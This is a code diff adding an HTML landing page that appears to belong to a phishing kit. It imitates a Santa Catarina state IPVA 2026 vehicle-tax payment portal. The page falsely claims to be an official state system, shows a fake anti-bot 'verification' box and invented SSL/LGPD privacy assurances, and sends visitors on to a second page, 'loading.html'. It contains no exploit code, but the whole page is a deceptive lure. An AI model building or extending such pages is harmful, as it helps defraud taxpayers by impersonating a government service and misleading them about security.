@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IPVA SC</title>
+
+<style>
+body{
+  margin:0;
+  font-family:Arial,sans-serif;
+  background:#f2f4f7;
+
+  display:flex;
+  justify-content:center;
+  align-items:center;
+
+  min-height:100vh;
+  padding:12px;
+  box-sizing:border-box;
+}
+
+.card{
+  width:100%;
+  max-width:420px;
+  background:#fff;
+  border-radius:16px;
+  overflow:hidden;
+  box-shadow:0 10px 25px rgba(0,0,0,.12);
+}
+
+/* HEADER */
+.header{
+  background:linear-gradient(135deg,#c22b00,#d84315);
+  color:#fff;
+  text-align:center;
+  padding:22px 16px;
+}
+
+.icon{
+  width:46px;
+  height:46px;
+  margin:0 auto 10px;
+  border-radius:50%;
+  background:rgba(255,255,255,.15);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-weight:bold;
+}
+
+.header h1{
+  margin:6px 0;
+  font-size:18px;
+}
+
+.header p{
+  font-size:12px;
+  margin:0;
+  opacity:.95;
+  line-height:1.4;
+}
+
+/* SECTION */
+.section{
+  padding:14px;
+}
+
+/* INFO BOX */
+.info-box{
+  display:flex;
+  gap:10px;
+  background:#eef5ff;
+  border:1px solid #cfe2ff;
+  padding:12px;
+  border-radius:12px;
+  font-size:12px;
+  color:#1d4ed8;
+  line-height:1.4;
+}
+
+.info-icon{
+  width:18px;
+  height:18px;
+  min-width:18px;
+  border-radius:50%;
+  background:#1d4ed8;
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:12px;
+  font-weight:bold;
+}
+
+/* VERIFICAÇÃO */
+.verify{
+  margin-top:12px;
+  border:1px solid #ddd;
+  border-radius:12px;
+  padding:12px;
+  font-size:13px;
+  display:flex;
+  align-items:center;
+  gap:8px;
+  color:#444;
+}
+
+.dot{
+  width:10px;
+  height:10px;
+  background:#22c55e;
+  border-radius:50%;
+}
+
+/* BOTÃO */
+.btn{
+  width:100%;
+  margin-top:14px;
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  background:#0f7a3a;
+  color:#fff;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+}
+
+.check-icon{
+  width:18px;
+  height:18px;
+}
+
+/* FOOTER */
+.footer{
+  font-size:11px;
+  color:#777;
+  text-align:center;
+  padding:14px;
+  border-top:1px solid #eee;
+}
+
+.lgpd{
+  margin-top:6px;
+  font-size:10.5px;
+  color:#999;
+  line-height:1.4;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+  <div class="header">
+
+    <div class="icon">✔</div>
+
+    <h1>IPVA SC</h1>
+
+    <p>
+      Acesse o nosso portal com maior segurança, tenha uma excelente experiência e rapidez através do nosso canal de emissão SC, canal autorizado e seguro.
+    </p>
+
+  </div>
+
+  <div class="section">
+
+    <div class="info-box">
+      <div class="info-icon">i</div>
+      <div>
+        Esta verificação protege o portal contra acessos automatizados e garante uma experiência segura para todos os usuários.
+      </div>
+    </div>
+
+    <div class="verify">
+      <div class="dot"></div>
+      Clique no botão para continuar
+    </div>
+
+    <!-- 🔥 AQUI ELE VAI PARA A SEGUNDA PÁGINA -->
+    <button class="btn" onclick="window.location.href='loading.html'">
+
+      <svg class="check-icon" viewBox="0 0 24 24" fill="white">
+        <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.6 0 12 0zm-2 17l-5-5 1.4-1.4L10 14.2l7.6-7.6L19 8l-9 9z"/>
+      </svg>
+
+      PAGAMENTO - IPVA 2026 SC
+
+    </button>
+
+  </div>
+
+  <div class="footer">
+    SISTEMA OFICIAL — VINCULADO AO ESTADO DE SC.
+
+    <div class="lgpd">
+      Privacidade garantida: Seus dados são protegidos por criptografia SSL 256-bit conforme a LGPD — Lei nº 13.709/2018.
+    </div>
+  </div>
+
+</div>
+
+</body>
+</html>
